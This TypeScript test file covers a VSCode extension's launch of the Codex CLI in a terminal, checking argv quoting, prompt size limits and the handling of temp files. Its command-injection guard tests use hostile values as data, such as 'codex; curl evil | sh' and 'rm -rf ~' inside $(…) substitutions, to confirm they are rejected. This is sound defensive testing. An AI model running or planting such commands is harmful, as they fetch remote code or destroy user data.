/**
 * skillRunner.codexInteractive.test.ts
 *
 * Tests for Codex interactive-mode parity (#4024):
 * - buildCodexInteractiveLaunchCommand() quote-safe TUI seeding
 * - runStageSkillInteractive() Codex branch launches the TUI in a VSCode
 *   terminal (no child process) and reports interactive mode.
 *
 * @see Issue #4024 - Codex interactive-mode parity in the VSCode extension
 */

import { describe, it, expect, vi, beforeEach, afterEach, type Mock } from "vitest";

vi.mock("vscode", () => {
  const terminal = {
    name: "mock-terminal",
    show: vi.fn(),
    sendText: vi.fn(),
    dispose: vi.fn(),
    exitStatus: undefined as { code: number | undefined } | undefined,
  };
  const closeListeners: Array<(t: unknown) => void> = [];
  return {
    workspace: {
      workspaceFolders: [{ uri: { fsPath: "/test/workspace" } }],
    },
    window: {
      terminals: [],
      createTerminal: vi.fn(() => terminal),
      onDidCloseTerminal: vi.fn((cb: (t: unknown) => void) => {
        closeListeners.push(cb);
        return { dispose: vi.fn() };
      }),
      showWarningMessage: vi.fn().mockResolvedValue(undefined),
    },
    extensions: { getExtension: vi.fn(() => null) },
    // test hooks
    __terminal: terminal,
    __closeListeners: closeListeners,
  };
});

vi.mock("fs", () => ({
  existsSync: vi.fn(() => true),
  readFileSync: vi.fn(
    () => `---
name: test-skill
allowed-tools: Read Write Edit Bash
---
# Test Skill
`
  ),
  writeFileSync: vi.fn(),
  unlinkSync: vi.fn(),
}));

// `skill render` is a real subprocess since #79 — the interactive dispatcher
// composes through the binary too, with no --model (the user's own session
// model runs, and this process cannot know it).
vi.mock("child_process", async () => {
  const actual = await vi.importActual<typeof import("child_process")>("child_process");
  const { isSkillRenderCall, skillRenderStdout } = await import("../helpers/skillRender");
  return {
    ...actual,
    execFileSync: vi.fn((cmd: string, args: string[], opts: unknown) =>
      isSkillRenderCall(args)
        ? skillRenderStdout(args, { allowedTools: ["Read", "Write", "Edit", "Bash"] })
        : (actual.execFileSync as (...a: unknown[]) => unknown)(cmd, args, opts)
    ),
  };
});

// Keep every real SDK export (validateModelForAdapter, PipelineStage, …) but
// make the Codex steering/MCP provisioners inert so this unit test never touches
// the real ~/.codex/config.toml or AGENTS.md (they have their own SDK tests).
vi.mock("@nightgauge/sdk", async () => {
  const actual = await vi.importActual<Record<string, unknown>>("@nightgauge/sdk");
  return {
    ...actual,
    CodexContextGenerator: class {
      generateSync() {
        return "/test/workspace/AGENTS.md";
      }
      generate() {
        return Promise.resolve("/test/workspace/AGENTS.md");
      }
      cleanupSync() {}
      cleanup() {
        return Promise.resolve();
      }
    },
    CodexMcpProvisioner: class {
      provisionSync() {
        return null;
      }
      provision() {
        return Promise.resolve(null);
      }
    },
  };
});

vi.mock("../../src/utils/configPathResolver", () => ({
  resolveConfigPathSync: vi.fn(() => ({
    path: "/test/workspace/.nightgauge/config.yaml",
    isLegacy: false,
    exists: false,
  })),
  logDeprecationWarning: vi.fn(),
}));

vi.mock("../../src/utils/nightgaugeConfig", async () => {
  const actual = await vi.importActual<Record<string, unknown>>("../../src/utils/nightgaugeConfig");
  return {
    ...actual,
    getAuthProvider: vi.fn(() => "max"),
    getExecutionAdapter: vi.fn((): string => "codex"),
    getStageMcpTools: vi.fn(() => []),
    getMcpToolsConfig: vi.fn(() => []),
    getCodexCliCommand: vi.fn((): string => "codex"),
  };
});

vi.mock("../../src/services/RepositoryContextLoader", () => ({
  RepositoryContextLoader: {
    getInstance: vi.fn(() => ({
      getCurrentRepository: vi.fn().mockReturnValue(null),
      getWorkingDirectory: vi.fn().mockReturnValue("/test/workspace"),
    })),
  },
}));

import {
  buildCodexInteractiveLaunch,
  codexPromptArgLimit,
  environmentArgBytes,
  DARWIN_ARG_MAX,
  LINUX_MAX_ARG_STRLEN,
  runStageSkillInteractive,
  killAllActiveProcesses,
} from "../../src/utils/skillRunner";
import * as vscode from "vscode";
import * as fs from "fs";
import * as path from "node:path";

const vscodeHooks = vscode as unknown as {
  __terminal: {
    sendText: Mock;
    show: Mock;
    dispose: Mock;
    exitStatus: { code: number | undefined } | undefined;
  };
  __closeListeners: Array<(t: unknown) => void>;
};
const mockTerminal = vscodeHooks.__terminal;
/** Simulate the VSCode terminal closing (Codex exited) with an exit code. */
function closeTerminal(code: number | undefined): void {
  mockTerminal.exitStatus = code === undefined ? undefined : { code };
  for (const cb of vscodeHooks.__closeListeners) cb(mockTerminal);
}

/**
 * The largest prompt any pipeline stage can render, bounded from above by every
 * byte the renderer could compose it from: the stage's whole skill directory
 * plus the whole shared tree. Measured on 2026-10-01 the largest rendered
 * stage (pr-merge) was 155,121 bytes; this bound is larger than any of them.
 */
async function largestStagePromptUpperBound(): Promise<number> {
  // `fs` is mocked for the runner; measure with the real one.
  const fsReal = await vi.importActual<typeof import("fs")>("fs");
  const skillsRoot = path.join(__dirname, "..", "..", "..", "..", "skills");
  const dirBytes = (dir: string): number =>
    fsReal.readdirSync(dir, { withFileTypes: true }).reduce((sum, entry) => {
      const full = path.join(dir, entry.name);
      return sum + (entry.isDirectory() ? dirBytes(full) : fsReal.statSync(full).size);
    }, 0);
  const stages = [
    "issue-pickup",
    "feature-planning",
    "feature-dev",
    "feature-validate",
    "pr-create",
    "pr-merge",
  ];
  const shared = dirBytes(path.join(skillsRoot, "_shared"));
  return (
    Math.max(...stages.map((st) => dirBytes(path.join(skillsRoot, `nightgauge-${st}`)))) + shared
  );
}

describe("buildCodexInteractiveLaunch (#4024, #2321)", () => {
  const darwin = { platform: "darwin" as const, envBytes: 8192 };

  it("passes the prompt as one argv string to codex, with no shell", () => {
    const launch = buildCodexInteractiveLaunch("codex", "gpt-5.4", "do the thing", darwin);
    expect(launch).toEqual({
      shellPath: "codex",
      shellArgs: ["--model", "gpt-5.4", "do the thing"],
    });
  });

  it("involves no shell string, base64 step or temp file for a normal prompt", () => {
    const launch = buildCodexInteractiveLaunch("codex", "gpt-5.4", "prompt", darwin);
    const flat = JSON.stringify(launch);
    expect(flat).not.toMatch(/base64|openssl|rm -f|; exit/);
    expect(launch.promptFile).toBeUndefined();
  });

  it("omits the --model flag when no model is given", () => {
    const launch = buildCodexInteractiveLaunch("codex", undefined, "p", darwin);
    expect(launch.shellArgs).toEqual(["p"]);
  });

  it("honors a custom codex CLI command", () => {
    const launch = buildCodexInteractiveLaunch("/opt/codex", "gpt-5.5", "p", darwin);
    expect(launch.shellPath).toBe("/opt/codex");
    expect(launch.shellArgs.slice(0, 2)).toEqual(["--model", "gpt-5.5"]);
  });

  it("keeps quotes, backticks and $ in the prompt byte for byte", () => {
    const prompt = "Run `git log` and \"echo $HOME\"; rm -rf ~ $(whoami) 'q'";
    const launch = buildCodexInteractiveLaunch("codex", undefined, prompt, darwin);
    expect(launch.shellArgs).toEqual([prompt]);
  });

  it("REJECTS a codexCmd with shell metacharacters (command-injection guard)", () => {
    // A malicious .nightgauge/config.yaml on a cloned repo could set this.
    expect(() =>
      buildCodexInteractiveLaunch("codex; curl evil | sh", "gpt-5.4", "p", darwin)
    ).toThrow(/Unsafe Codex CLI command/);
    expect(() => buildCodexInteractiveLaunch("codex $(rm -rf ~)", undefined, "p", darwin)).toThrow(
      /Unsafe/
    );
    expect(() => buildCodexInteractiveLaunch("codex foo", undefined, "p", darwin)).toThrow();
  });

  it("DROPS a model with shell metacharacters rather than passing it", () => {
    const launch = buildCodexInteractiveLaunch("codex", "gpt; rm -rf ~", "p", darwin);
    expect(launch.shellArgs).toEqual(["p"]);
  });

  it("accepts an absolute path as codexCmd", () => {
    expect(() =>
      buildCodexInteractiveLaunch("/usr/local/bin/codex", "gpt-5.4", "p", darwin)
    ).not.toThrow();
  });

  it("derives the limit per platform: 128 KiB per string on Linux, ARG_MAX less env on macOS", () => {
    expect(codexPromptArgLimit("linux", 999_999)).toBe(LINUX_MAX_ARG_STRLEN - 1);
    expect(codexPromptArgLimit("darwin", 0)).toBeLessThan(DARWIN_ARG_MAX);
    expect(codexPromptArgLimit("darwin", 100_000)).toBe(codexPromptArgLimit("darwin", 0) - 100_000);
    expect(codexPromptArgLimit("darwin", 2 * DARWIN_ARG_MAX)).toBe(0);
  });

  it("counts the environment as KEY=value plus a NUL per entry", () => {
    expect(environmentArgBytes({ A: "1", BC: "" })).toBe("A=1".length + 1 + "BC=".length + 1);
  });

  it("over the limit, tells Codex to read the prompt from a plain file instead", () => {
    const prompt = "x".repeat(LINUX_MAX_ARG_STRLEN);
    const launch = buildCodexInteractiveLaunch("codex", "gpt-5.4", prompt, {
      platform: "linux",
      envBytes: 0,
      oversizePromptPath: "/tmp/codex-interactive-abc.md",
    });
    expect(launch.promptFile).toEqual({ path: "/tmp/codex-interactive-abc.md", content: prompt });
    expect(launch.shellArgs[0]).toBe("--model");
    const seed = launch.shellArgs[2];
    expect(seed).toContain("/tmp/codex-interactive-abc.md");
    expect(Buffer.byteLength(seed)).toBeLessThan(1024);
    expect(JSON.stringify(launch.shellArgs)).not.toMatch(/base64|openssl/);
  });

  it("refuses an oversize prompt when no file path is given, rather than truncating it", () => {
    expect(() =>
      buildCodexInteractiveLaunch("codex", undefined, "x".repeat(LINUX_MAX_ARG_STRLEN), {
        platform: "linux",
        envBytes: 0,
      })
    ).toThrow(/over the .*argument limit/);
  });

  it("the largest stage prompt fits argv on macOS and takes the file route on Linux", async () => {
    const bound = await largestStagePromptUpperBound();
    // Not vacuous: the bound covers the measured 155,121-byte pr-merge render.
    expect(bound).toBeGreaterThan(155_121);
    const prompt = "y".repeat(bound);
    // A generous macOS environment (64 KiB) still leaves room for the prompt.
    const mac = buildCodexInteractiveLaunch("codex", "gpt-5.4", prompt, {
      platform: "darwin",
      envBytes: 65_536,
      oversizePromptPath: "/tmp/p.md",
    });
    expect(mac.promptFile).toBeUndefined();
    expect(mac.shellArgs[2]).toHaveLength(bound);
    const linux = buildCodexInteractiveLaunch("codex", "gpt-5.4", prompt, {
      platform: "linux",
      envBytes: 65_536,
      oversizePromptPath: "/tmp/p.md",
    });
    expect(linux.promptFile?.content).toHaveLength(bound);
    expect(Buffer.byteLength(linux.shellArgs[2])).toBeLessThan(LINUX_MAX_ARG_STRLEN);
  });
});

describe("runStageSkillInteractive - Codex TUI branch (#4024)", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    killAllActiveProcesses();
  });

  it("launches the Codex TUI in a terminal seeded with the prompt", () => {
    const onMode = vi.fn();
    const onStderr = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onMode, onStderr });

    expect(vi.mocked(vscode.window.createTerminal)).toHaveBeenCalledTimes(1);
    const createArg = vi.mocked(vscode.window.createTerminal).mock.calls[0][0] as unknown as {
      name: string;
      cwd: string;
    };
    expect(createArg.name).toContain("Codex");
    expect(createArg.name).toContain("#42");

    expect(mockTerminal.show).toHaveBeenCalled();
    // Codex is the terminal's own process: no shell string is typed into it (#2321).
    expect(mockTerminal.sendText).not.toHaveBeenCalled();
    const launchArg = vi.mocked(vscode.window.createTerminal).mock.calls[0][0] as unknown as {
      shellPath: string;
      shellArgs: string[];
    };
    expect(launchArg.shellPath).toBe("codex");
    // model resolved + validated for codex (#4021)
    expect(launchArg.shellArgs[0]).toBe("--model");
    expect(launchArg.shellArgs.at(-1)).toContain("Execute the following pipeline skill");
    // A normal-sized prompt writes no file.
    expect(vi.mocked(fs.writeFileSync)).not.toHaveBeenCalled();

    expect(onMode).toHaveBeenCalledWith("interactive");
  });

  it("over the limit, writes the prompt 0600 for Codex to read and removes it on close", () => {
    // An environment larger than macOS ARG_MAX leaves no room for any argv prompt.
    const platform = Object.getOwnPropertyDescriptor(process, "platform")!;
    Object.defineProperty(process, "platform", { value: "darwin" });
    vi.stubEnv("NIGHTGAUGE_TEST_HUGE_ENV", "x".repeat(DARWIN_ARG_MAX));
    try {
      runStageSkillInteractive("feature-dev", 42, {});
      const [file, content, opts] = vi.mocked(fs.writeFileSync).mock.calls[0] as unknown as [
        string,
        string,
        { mode: number },
      ];
      expect(file).toMatch(/codex-interactive-.*\.md$/);
      expect(content).toContain("Execute the following pipeline skill");
      expect(opts.mode).toBe(0o600);
      const launchArg = vi.mocked(vscode.window.createTerminal).mock.calls[0][0] as unknown as {
        shellArgs: string[];
      };
      expect(launchArg.shellArgs.at(-1)).toContain(file);
      expect(vi.mocked(fs.unlinkSync)).not.toHaveBeenCalled();
      closeTerminal(0);
      expect(vi.mocked(fs.unlinkSync)).toHaveBeenCalledWith(file);
    } finally {
      vi.unstubAllEnvs();
      Object.defineProperty(process, "platform", platform);
    }
  });

  it("returns a terminal-backed handle (no child process) that is interactive", () => {
    const handle = runStageSkillInteractive("feature-dev", 42, {});
    expect(handle.isInteractive).toBe(true);
    expect(handle.process).toBeNull();
    expect(typeof handle.writeToStdin).toBe("function");
    // writeToStdin forwards into the terminal
    expect(handle.writeToStdin!("hello")).toBe(true);
    expect(mockTerminal.sendText).toHaveBeenCalledWith("hello");
  });

  it("does NOT spawn the claude CLI for the codex adapter", () => {
    // (No spawn mock is configured here; if the codex branch fell through to the
    // claude piped-stdio path it would call spawn('claude', …) and throw.)
    expect(() => runStageSkillInteractive("feature-dev", 42, {})).not.toThrow();
  });

  it("(#1) fires onComplete with success when the terminal closes with exit 0", () => {
    const onComplete = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onComplete });
    expect(onComplete).not.toHaveBeenCalled(); // not until the terminal closes
    closeTerminal(0);
    expect(onComplete).toHaveBeenCalledTimes(1);
    expect(onComplete.mock.calls[0][0]).toMatchObject({ success: true, exitCode: 0 });
  });

  it("(#1) fires onComplete with failure on a non-zero terminal exit", () => {
    const onComplete = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onComplete });
    closeTerminal(1);
    expect(onComplete.mock.calls[0][0]).toMatchObject({ success: false, exitCode: 1 });
  });

  it("(#1) onComplete fires exactly once even if the terminal-close event repeats", () => {
    const onComplete = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onComplete });
    closeTerminal(0);
    closeTerminal(0);
    expect(onComplete).toHaveBeenCalledTimes(1);
  });

  it("(#7) kill() reports failure (aborted), not success", () => {
    const onComplete = vi.fn();
    const handle = runStageSkillInteractive("feature-dev", 42, { onComplete });
    handle.kill();
    expect(mockTerminal.dispose).toHaveBeenCalled();
    expect(onComplete).toHaveBeenCalledTimes(1);
    expect(onComplete.mock.calls[0][0]).toMatchObject({ success: false });
  });

  it("ABORTS (no terminal) when codex.cli_command is malicious (injection guard)", async () => {
    const { getCodexCliCommand } = await import("../../src/utils/nightgaugeConfig");
    // Persistent override: the prereq probe also reads getCodexCliCommand, so a
    // one-shot would be consumed before the launch helper sees it.
    vi.mocked(getCodexCliCommand).mockReturnValue("codex; curl evil | sh");
    try {
      const onComplete = vi.fn();
      const onError = vi.fn();
      runStageSkillInteractive("feature-dev", 42, { onComplete, onError });

      expect(vi.mocked(vscode.window.createTerminal)).not.toHaveBeenCalled();
      expect(onError).toHaveBeenCalled();
      expect(onComplete.mock.calls[0][0]).toMatchObject({ success: false });
    } finally {
      vi.mocked(getCodexCliCommand).mockReturnValue("codex");
    }
  });
});
